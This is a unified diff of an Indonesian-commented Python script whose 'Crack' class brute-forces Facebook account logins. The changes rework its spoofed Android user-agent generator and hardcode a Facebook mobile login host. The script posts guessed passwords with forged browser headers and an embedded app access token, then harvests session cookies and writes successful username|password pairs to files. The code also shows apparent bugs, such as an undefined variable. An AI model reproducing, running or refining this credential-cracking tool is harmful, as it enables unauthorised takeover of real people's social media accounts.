@@ -26,7 +26,7 @@ P2 = "[#FFFFFF]" # PUTIH
 ###----------[ GLOBAL NAMA ]---------- ###
 sekarang = calendar.timegm(time.gmtime(time.time()))
 tampung = []
-ugent_api = []
+ugent = []
 ugent_reguler = []
 
 ###----------[ CEK WARNA TEMA ]---------- ###
@@ -48,14 +48,13 @@ versi_app = str(random.randint(111111111,999999999))
 for z in range(200):
 	versi_android = str(random.randint(4,12))+".0.0"
 	versi_chrome = str(random.randint(300,325))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
-	build = random.choice(["LGL157BL Build/NRD90U","LGL125DL Build/OPM1.171019.026","LG-L122c Build/KOT49I","LGL164VL Build/NRD90U","LGL18VC Build/LMY47V","LGL21G Build/LRX21Y","LG-L220L Build/IML74K","LG-L260L Build/IML74K","LG-D170 Build/KOT49I.A1399879955","LGL43AL Build/LMY47V","LGL44VL Build/LMY47V","LGL45C Build/GRJ22","LGL51AL Build/LMY47V","LGL59BL Build/NRD90U","LG-X147 Build/KOT49H.V10e","LG-D280 Build/KOT49I.A1441760672","LG-D340f8 Build/KOT49I.A1398387929","LGMS345 Build/LMY47V","LG-LS998U Build/OPM6.171019.030.H1","LG-LW770 Build/IMM76I","LG-LW690 Build/FRG83G"])
-	dev = build.split(" Build/")[0]
-	ua_api = f"Dalvik/2.1.0 (Linux; U; Android {versi_android}; {build}) [FBAN/MessengerLite;FBAV/{versi_chrome};FBBV/{str(random.randint(111111111,999999999))};FBDM/"+"{density=2.0,width=720,height=1360};"+f"FBLC/en_US;FBRV/{str(random.randint(111111111,999999999))};FBCR/mt:s;FBMF/LG;FBBD/LG;FBPN/com.facebook.mlite;FBDV/{dev};FBSV/{versi_android};FBOP/19;FBCA/armeabi-v7a:armeabi;]"
-	if ua_api in ugent_api:pass
-	else:ugent_api.append(ua_api)
-	ua_reguler = f"Mozilla/5.0 (Linux; Android {versi_android}; {build}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{versi_chrome} Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/{str(random.randint(300, 390))}.0.0.16.{str(random.randint(100,120))};]"
-	if ua_reguler in ugent_reguler:pass
-	else:ugent_reguler.append(ua_reguler)
+	device = random.choice(["Nexus 5 Build/NHG47L","Nexus 7 Build/LMY47V","Nexus 5X Build/N4F26T","Nexus 6P Build/OPM5.171019.014","Nexus 5X Build/OPR6.170623.023","Nexus 6 Build/OPM5.171019.015","Nexus 5X Build/MMB29K","Nexus 5X Build/OPM6.171019.030.H1"])
+	dev = device.split(" Build/")[0]
+	az = "A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"
+	build = f"{random.choice(az)}{random.choice(az)}{random.choice(az)}{random.randint(10, 90)}{random.choice(az)}"
+	ua = f"Mozilla/5.0 (Linux; Android {versi_android}; LG-F320L Build/{build}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{versi_chrome} Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/309.0.0.16.{str(random.randint(100000, 900000))};]"
+	if ua in ugent:pass
+	else:ugent.append(ua)
 	
 ###----------[ LOGO AUTHOR DAN VERSI]---------- ###
 class Logo:
@@ -565,7 +564,7 @@ class Crack:
 		try:
 			for pw in pwx:
 				pw = pw.lower()
-				ua = random.choice(ugent_api)
+				ua = random.choice(ugent)
 				params = {
 					"access_token": "200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16",
 					"sdk_version": f"{str(random.randint(1,26))}", 
@@ -632,9 +631,9 @@ class Crack:
 		try:
 			for pw in pwx:
 				pw = pw.lower()
-				ua = random.choice(ugent_reguler)
+				ua = random.choice(ugent)
 				ses.headers.update({
-					"host": f"{url}",
+					"host": "m.alpha.facebook.com",
 					"cache-control": "max-age=0",
 					"connection": "keep-alive",
 					"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
@@ -646,9 +645,9 @@ class Crack:
 					"accept-language": "id,en-US;q=0.9,en;q=0.8",
 					"user-agent": ua
 				})
-				get = ses.get(f"https://{url}/login.php").text
+				get = ses.get(f"https://m.alpha.facebook.com/login.php?").text
 				data = {
-					"jazoest": re.search('name="jazoest" value="(\d+)"',str(get)).group(1),
+					"jazoest": re.search('name="jazoest" value="(.*?)"',str(get)).group(1),
 					"lsd": re.search('name="lsd" value="(.*?)"',str(get)).group(1),
 					"m_ts": re.search('name="m_ts" value="(.*?)"',str(get)).group(1),
 					"li": re.search('name="li" value="(.*?)"',str(get)).group(1),
@@ -665,16 +664,27 @@ class Crack:
 					"had_password_prefilled": True,
 					"is_smart_lock": False
 				}
-				ses.headers.update({
+				headers = {
+					"host": f"{url}",
+					"cache-control": "max-age=0",
+					"connection": "keep-alive",
+					"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+					"upgrade-insecure-requests": "1",
+					"sec-fetch-mode": "navigate",
+					"sec-fetch-sest": "document",
+					"sec-fetch-site": "none",
+					"sec-fetch-user": "?1",
+					"accept-language": "id,en-US;q=0.9,en;q=0.8",
+					"user-agent": ua,
 					"cookie": ("; ".join([str(x)+"="+str(y) for x,y in ses.cookies.get_dict().items()])),
 					"sec-fetch-site": "same-origin",
 					"origin": f"https://{url}",
-					"referer": f"https://{url}/login.php?",
+					"referer": f"https://m.alpha.facebook.com/login.php?",
 					"content-length": str(len(("&").join([ "%s=%s" % (x, y) for x, y in data.items() ]))),
 					"x-fb-lsd": str(data.get("lsd")),
 					"content-type": "application/x-www-form-urlencoded"
-				})
-				post = ses.post(f"https://{url}/login/device-based/login/async/?refsrc=deprecated&lwv=100",data=data,allow_redirects=True)
+				}
+				post = ses.post(f"https://{url}/login/device-based/login/async/?refsrc=deprecated&lwv=100",headers=headers,data=data,allow_redirects=True)
 				if "c_user" in ses.cookies.get_dict():
 					cookie = ";".join(i["name"]+"="+i["value"] for i in ses.cookies.get_dict())
 					user = re.findall("c_user=(\d+)",coki)[0]
@@ -702,7 +712,8 @@ class Crack:
 						open(f"CP/{self.hari_ini}.txt","a").write(f"{user}|{pw}\n")
 						break
 				else:continue
-		except ConnectionError:
+		except Exception as e:
+			print(e)
 			time.sleep(30)
 			self.metode_reguler(user,pwx,url)
 		self.loop +=1
